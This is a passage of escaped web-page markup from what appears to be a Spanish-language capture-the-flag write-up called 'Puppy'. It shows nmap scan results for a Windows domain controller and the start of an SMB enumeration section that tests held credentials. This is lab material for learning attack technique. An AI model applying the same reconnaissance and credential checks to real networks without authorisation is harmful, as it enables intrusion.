class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp open http Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Not Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp open mc-nmf .NET Message Framing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49664/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49667/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49669/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e63992/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e64010/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: 6h59m58s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e 3:1:1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ Message signing enabled and required\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e date: 2025-06-02T14:37:20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 208.23 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"enumeraci√≥n-smb\"\u003eEnumeraci√≥n SMB\u003c/h1\u003e\n\u003cp\u003eComprobamos que las credenciales que tenemos sean v√°lidas para smb:\u003c/p\u003e","title":"Puppy"}]